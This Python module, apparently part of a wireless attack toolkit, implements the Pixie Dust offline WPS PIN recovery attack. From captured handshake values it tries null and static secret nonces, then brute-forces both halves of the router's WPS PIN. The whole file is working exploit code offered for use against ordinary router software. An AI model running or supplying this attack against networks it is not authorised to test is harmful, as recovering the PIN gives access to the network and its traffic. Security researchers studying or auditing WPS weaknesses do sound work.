"""Native PixieWPS offline PIN recovery helpers."""

from __future__ import annotations

from dataclasses import dataclass
from enum import Enum
from typing import Iterable

from wifit3.campaigns.wps import pins
from wifit3.dot11.wsc import crypto as wc


class PixieMode(Enum):
    NULL_SECRET = "null-secret"
    STATIC_SECRET = "static-secret"


@dataclass(frozen=True)
class PixieBundle:
    pke: bytes
    pkr: bytes
    e_hash1: bytes
    e_hash2: bytes
    e_nonce: bytes
    authkey: bytes
    enrollee_mac: bytes | None = None


@dataclass(frozen=True)
class PixieResult:
    pin: str | None = None
    mode: PixieMode | None = None
    found: bool = False


SecretPair = tuple[bytes, bytes]


NULL_SECRET_PAIR: SecretPair = (b"\x00" * wc.SECRET_NONCE_LEN, b"\x00" * wc.SECRET_NONCE_LEN)


def recover_pin(
    bundle: PixieBundle,
    modes: Iterable[PixieMode | str] = (PixieMode.NULL_SECRET, PixieMode.STATIC_SECRET),
    static_secrets: Iterable[SecretPair] = (),
) -> PixieResult:
    for mode in _normalize_modes(modes):
        if mode is PixieMode.NULL_SECRET:
            pin = _recover_with_secret_pair(bundle, NULL_SECRET_PAIR)
            if pin is not None:
                return PixieResult(pin=pin, mode=mode, found=True)
        elif mode is PixieMode.STATIC_SECRET:
            for secret_pair in static_secrets:
                pin = _recover_with_secret_pair(bundle, secret_pair)
                if pin is not None:
                    return PixieResult(pin=pin, mode=mode, found=True)
    return PixieResult()


def _normalize_modes(modes: Iterable[PixieMode | str]) -> tuple[PixieMode, ...]:
    return tuple(mode if isinstance(mode, PixieMode) else PixieMode(mode) for mode in modes)


def _recover_with_secret_pair(bundle: PixieBundle, secret_pair: SecretPair) -> str | None:
    e_s1, e_s2 = secret_pair
    first4 = _find_first_half(bundle, e_s1)
    if first4 is None:
        return None
    return _find_second_half(bundle, e_s2, first4)


def _find_first_half(bundle: PixieBundle, e_s1: bytes) -> str | None:
    for value in range(10_000):
        first4 = f"{value:04d}"
        if wc.check_pin_half(
            bundle.authkey, e_s1, bundle.e_hash1, first4.encode("ascii"), bundle.pke, bundle.pkr
        ):
            return first4
    return None


def _find_second_half(bundle: PixieBundle, e_s2: bytes, first4: str) -> str | None:
    for value in range(1_000):
        pin = pins.full_pin(first4, f"{value:03d}")
        if wc.check_pin_half(
            bundle.authkey, e_s2, bundle.e_hash2, pin[4:].encode("ascii"), bundle.pke, bundle.pkr
        ):
            return pin
    return None
